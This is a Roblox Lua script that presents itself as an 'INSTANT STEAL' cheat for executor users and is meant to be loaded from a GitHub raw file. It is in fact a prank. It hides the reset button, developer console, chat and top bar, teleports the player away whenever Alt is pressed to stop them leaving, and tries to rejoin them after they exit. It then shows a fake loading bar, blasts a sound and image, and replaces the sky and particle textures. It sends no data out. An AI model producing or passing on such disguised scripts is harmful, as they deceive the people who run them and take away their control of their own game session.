-- "STEAL A BRAINOT: INSTANT STEAL" - Roblox prank script for executor users
-- Place this as a GitHub raw file, load using: loadstring(game:HttpGet("RAW_GITHUB_URL_HERE"))()

--[[ 
    This script creates a fake loading GUI with random progress,
    blocks reset, tries to block exit (teleports rejoin on Alt),
    and after loading pranks the user visually & with sound.
    No use of .BindedToClose (which doesn't exist).
    For "Steal a Brainot" style games, executor prank.
--]]

-- === CONFIG ===
local IMAGE_TEXTURE_ID = "rbxassetid://5863569299"
local IMAGE_ASSET_ID = "rbxassetid://5863569319"
local SOUND_ID = "rbxassetid://7520198169"
local FINAL_MUSIC_ID = "rbxassetid://133838630142849"
local FINAL_PARTY_TEXTURE = "rbxassetid://70737147873213"
local FINAL_SKYBOX_TEXTURE = "rbxassetid://73730735468991"
local REJOIN_PLACE_ID = 1752868452747

-- === SERVICES ===
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer

-- === BLOCK RESET & UI ===
pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
pcall(function() StarterGui:SetCore("DevConsoleVisible", false) end)
pcall(function() StarterGui:SetCore("ChatActive", false) end)
pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)

-- === BLOCK EXIT (ALT REJOIN) ===
UserInputService.InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.LeftAlt or input.KeyCode == Enum.KeyCode.RightAlt then
        TeleportService:Teleport(REJOIN_PLACE_ID, player)
    end
end)

-- Try to rejoin if player leaves (prank, not always effective)
spawn(function()
    while task.wait(1) do
        pcall(function()
            if not player or not player.Parent then
                TeleportService:Teleport(REJOIN_PLACE_ID)
            end
        end)
    end
end)

-- === RANDOM LOADING GUI ===
local function randomLoadingTime()
    local r = math.random()
    if r < 0.25 then
        return 0
    elseif r < 0.5 then
        return math.random(1, 2)
    elseif r < 0.8 then
        return math.random(2, 6)
    else
        return math.random(7, 14)
    end
end

local function createLoadingGui()
    local sg = Instance.new("ScreenGui")
    sg.Name = "BrainotPrankLoading"
    sg.IgnoreGuiInset = true
    sg.ResetOnSpawn = false
    sg.Parent = player:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.BackgroundColor3 = Color3.new(0,0,0)
    bg.Size = UDim2.new(1,0,1,0)
    bg.ZIndex = 1
    bg.Parent = sg

    local barBG = Instance.new("Frame")
    barBG.AnchorPoint = Vector2.new(0.5, 0.5)
    barBG.Position = UDim2.new(0.5,0,0.6,0)
    barBG.Size = UDim2.new(0.6,0,0.06,0)
    barBG.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
    barBG.BorderSizePixel = 0
    barBG.ZIndex = 2
    barBG.Parent = sg

    local bar = Instance.new("Frame")
    bar.AnchorPoint = Vector2.new(0,0)
    bar.Position = UDim2.new(0,0,0,0)
    bar.Size = UDim2.new(0,0,1,0)
    bar.BackgroundColor3 = Color3.new(0,0.67,1)
    bar.BorderSizePixel = 0
    bar.ZIndex = 3
    bar.Parent = barBG

    local percentLbl = Instance.new("TextLabel")
    percentLbl.AnchorPoint = Vector2.new(0.5, 0.5)
    percentLbl.Position = UDim2.new(0.5,0,0.45,0)
    percentLbl.Size = UDim2.new(0.25,0,0.1,0)
    percentLbl.TextScaled = true
    percentLbl.Text = "0%"
    percentLbl.BackgroundTransparency = 1
    percentLbl.TextColor3 = Color3.new(1,1,1)
    percentLbl.Font = Enum.Font.GothamBold
    percentLbl.ZIndex = 4
    percentLbl.Parent = sg

    return sg, bar, percentLbl
end

local function showImageAndSound()
    local sg = Instance.new("ScreenGui")
    sg.Name = "BrainotPrankFinal"
    sg.IgnoreGuiInset = true
    sg.ResetOnSpawn = false
    sg.Parent = player:WaitForChild("PlayerGui")

    local img = Instance.new("ImageLabel")
    img.AnchorPoint = Vector2.new(0.5,0.5)
    img.Position = UDim2.new(0.5,0,0.5,0)
    img.Size = UDim2.new(0.6,0,0.6,0)
    img.BackgroundTransparency = 1
    img.Image = IMAGE_TEXTURE_ID
    img.ZIndex = 10
    img.Parent = sg

    local img2 = Instance.new("ImageLabel")
    img2.AnchorPoint = Vector2.new(0.5,0.5)
    img2.Position = UDim2.new(0.5,0,0.85,0)
    img2.Size = UDim2.new(0.2,0,0.13,0)
    img2.BackgroundTransparency = 1
    img2.Image = IMAGE_ASSET_ID
    img2.ZIndex = 11
    img2.Parent = sg

    local sound = Instance.new("Sound")
    sound.SoundId = SOUND_ID
    sound.Volume = 1
    sound.Parent = sg
    sound:Play()

    task.wait(5)
    sg:Destroy()
    sound:Destroy()
end

local function setFinalEffects()
    -- Music
    local music = Instance.new("Sound")
    music.SoundId = FINAL_MUSIC_ID
    music.Looped = true
    music.Volume = 1
    music.Parent = workspace
    music:Play()

    -- Change all ParticleEmitter/Trail textures
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
            pcall(function() obj.Texture = FINAL_PARTY_TEXTURE end)
        end
    end

    -- Change Skybox
    local sky = Instance.new("Sky")
    sky.SkyboxBk = FINAL_SKYBOX_TEXTURE
    sky.SkyboxDn = FINAL_SKYBOX_TEXTURE
    sky.SkyboxFt = FINAL_SKYBOX_TEXTURE
    sky.SkyboxLf = FINAL_SKYBOX_TEXTURE
    sky.SkyboxRt = FINAL_SKYBOX_TEXTURE
    sky.SkyboxUp = FINAL_SKYBOX_TEXTURE
    for _, s in pairs(Lighting:GetChildren()) do
        if s:IsA("Sky") then s:Destroy() end
    end
    sky.Parent = Lighting
end

-- === MAIN ===
math.randomseed(tick())

local gui, bar, lbl = createLoadingGui()
local duration = randomLoadingTime()
local st = tick()
local done = false

if duration == 0 then
    bar.Size = UDim2.new(1,0,1,0)
    lbl.Text = "100%"
    done = true
else
    while not done do
        local elapsed = tick() - st
        local progress = math.clamp(elapsed/duration, 0, 1)
        bar.Size = UDim2.new(progress,0,1,0)
        lbl.Text = tostring(math.floor(progress*100)) .. "%"
        if progress >= 1 then
            lbl.Text = "100%"
            bar.Size = UDim2.new(1,0,1,0)
            done = true
        end
        task.wait(0.05 + math.random()*0.07)
    end
end

task.wait(0.5 + math.random()*0.4)
gui:Destroy()

showImageAndSound()
setFinalEffects()

-- END
